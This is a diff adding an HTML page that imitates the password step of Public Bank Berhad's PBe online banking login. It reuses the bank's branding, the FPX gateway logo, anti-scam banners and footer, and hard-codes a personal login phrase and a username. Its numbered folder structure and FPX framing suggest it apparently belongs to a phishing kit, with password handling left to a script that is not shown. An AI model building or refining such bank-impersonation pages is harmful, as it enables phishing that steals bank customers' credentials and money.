@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login to PBe - Public Bank Berhad</title>
+  <link rel="stylesheet" href="../css/common.css">
+  <link rel="stylesheet" href="../css/login-password.css">
+  <link rel="shortcut icon" href="../images/pb_logo.png" type="image/png">
+</head>
+<body>
+
+  <!-- Top Navigation Header -->
+  <header class="pbb-header">
+    <div class="pbb-header-inner">
+      <div class="pbb-logo-wrap">
+        <a href="../1.Login username/index.html">
+          <img src="../images/pb_logo.png" alt="Public Bank Berhad">
+        </a>
+      </div>
+      <div class="fpx-logo-wrap">
+        <img src="../images/fpxLogo.png" alt="FPX Payment Gateway">
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Content Layout -->
+  <main class="login-main-container">
+    <div class="login-grid">
+      
+      <!-- Left Column: Login Card & Safe Card Banner -->
+      <div class="login-left-col">
+        <div class="login-card">
+          
+          <!-- Password Form Area -->
+          <div class="login-form-area">
+            <div>
+              <!-- Personal Login Phrase Badge -->
+              <div class="plp-phrase-badge">
+                Liew@92838826
+              </div>
+
+              <p class="plp-question-text">
+                Is your Personal Login Phrase correct?
+              </p>
+
+              <!-- Radio confirmation -->
+              <div class="plp-radio-group">
+                <label class="plp-radio-label">
+                  <input type="radio" name="phraseCorrect" value="yes" checked>
+                  <span>Yes</span>
+                </label>
+                <label class="plp-radio-label">
+                  <input type="radio" name="phraseCorrect" value="no" onclick="alert('If this is not your Personal Login Phrase, do not login. Contact PBe Customer Support for assistance.');">
+                  <span>No</span>
+                </label>
+              </div>
+
+              <form id="passwordForm" autocomplete="off">
+                <!-- Readonly Username -->
+                <input type="text" class="pbb-input-readonly" value="jimmyliew312" readonly>
+
+                <!-- Password Input -->
+                <div class="form-group">
+                  <div class="input-with-icon">
+                    <svg class="input-icon-svg" viewBox="0 0 20 20">
+                      <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"/>
+                    </svg>
+                    <input type="password" id="password" name="password" class="pbb-input" placeholder="Password" autocomplete="current-password" required>
+                  </div>
+                </div>
+
+                <!-- On-Screen Keyboard Hint -->
+                <div class="onscreen-keyboard-hint">
+                  <span class="kb-icon"></span>
+                  <span>For added security, please use our <a href="#">On-Screen Keyboard</a></span>
+                </div>
+
+                <!-- Actions: Cancel on Left, Back and Login on Right -->
+                <div class="login-actions-row">
+                  <a href="../1.Login username/index.html" class="btn-cancel-link">Cancel</a>
+                  <div class="actions-right-buttons">
+                    <button type="button" class="btn-pbb-back" onclick="window.location.href='../1.Login username/index.html'">Back</button>
+                    <button type="submit" class="btn-pbb-submit" id="submitPasswordBtn">Login</button>
+                  </div>
+                </div>
+              </form>
+            </div>
+          </div>
+
+          <!-- Right Sidebar Area Inside Login Card -->
+          <aside class="login-sidebar-area">
+            <div>
+              <h2 class="sidebar-section-title">New to PBe?</h2>
+              <ul class="sidebar-list">
+                <li class="sidebar-item">
+                  <span class="sidebar-arrow">&#9658;</span>
+                  <a href="#">Register</a>
+                </li>
+                <li class="sidebar-item">
+                  <span class="sidebar-arrow">&#9658;</span>
+                  <a href="#">PBe Online Security</a>
+                </li>
+                <li class="sidebar-item">
+                  <span class="sidebar-arrow">&#9658;</span>
+                  <a href="#">FAQs</a>
+                </li>
+                <li class="sidebar-item">
+                  <span class="sidebar-arrow">&#9658;</span>
+                  <a href="#">PBe Tutorials</a>
+                </li>
+              </ul>
+            </div>
+
+            <div>
+              <h2 class="sidebar-section-title">Need Help?</h2>
+              <ul class="sidebar-list">
+                <li class="sidebar-item">
+                  <span class="sidebar-arrow">&#9658;</span>
+                  <a href="#">Reset Password / Reactivate User ID</a>
+                </li>
+                <li class="sidebar-item">
+                  <span class="sidebar-arrow">&#9658;</span>
+                  <a href="#">Report Fraud/Scam Incident</a>
+                </li>
+                <li class="sidebar-item">
+                  <span class="sidebar-arrow">&#9658;</span>
+                  <a href="#" style="color: var(--pbb-red); font-weight: 700;">Kill Switch</a>
+                </li>
+              </ul>
+            </div>
+          </aside>
+
+        </div>
+
+        <!-- Travel Card Safety Banner -->
+        <div class="banner-travel-wrap">
+          <img src="../images/banner_travel.jpg" alt="Keep Your Card Safe While Travelling! - Jangan Kena Scam">
+        </div>
+      </div>
+
+      <!-- Right Column: BMW Campaign Banner -->
+      <div class="login-right-col">
+        <div class="banner-bmw-wrap">
+          <img src="../images/banner_bmw.jpg" alt="WIN A BMW i5! Find Out More">
+        </div>
+      </div>
+
+    </div>
+  </main>
+
+  <!-- Global Footer -->
+  <footer class="pbb-footer">
+    <div class="pbb-footer-inner">
+      <div class="pbb-footer-copy">
+        Copyright &copy; 2026 Public Bank Berhad 196501000672 (6463-H). ALL RIGHTS RESERVED.
+      </div>
+      <ul class="pbb-footer-links">
+        <li><a href="#">Terms</a></li>
+        <li><a href="#">FAQ</a></li>
+        <li><a href="#">Privacy</a></li>
+        <li><a href="#">Security</a></li>
+        <li><a href="#">Customer Service Charter</a></li>
+        <li><a href="#">Bank Negara Malaysia</a></li>
+      </ul>
+    </div>
+  </footer>
+
+  <script src="../js/app.js"></script>
+</body>
+</html>
